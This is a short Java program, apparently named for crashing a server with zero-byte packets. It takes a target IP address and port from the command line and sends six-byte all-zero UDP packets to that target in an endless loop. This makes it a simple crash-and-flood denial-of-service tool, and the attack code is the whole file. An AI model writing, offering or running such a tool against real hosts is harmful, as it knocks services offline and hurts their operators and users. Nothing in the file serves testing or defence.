/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package pkg0bytescrash;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import javax.xml.bind.DatatypeConverter;

/**
 *
 * @author Mateusz
 */
public class Main {

    /**
     * @param args the command line arguments
     */
    
    static String ip;
    static int port;
    public static void main(String[] args) {
        ip = args[0];
        port = Integer.parseInt(args[1]);
        while(true)
            sendPck("000000000000");
    }
    
    
    public static void sendPck(String str)
    {
       byte[] msg = DatatypeConverter.parseHexBinary(str);
        //byte[] msg = str.getBytes();
       DatagramPacket packet = null;
      try{
        InetAddress servAddr = InetAddress.getByName(ip);
        byte buf[] = msg;
        DatagramSocket socket= new DatagramSocket();
        socket.setSoTimeout(2000);
        socket.send(new DatagramPacket(buf, buf.length, servAddr, port));              //nastepnie komende
        socket.close();
        
     }catch(Exception ex)
        {
            System.out.println("pakiet "+ex );   
        }
      
    }
}
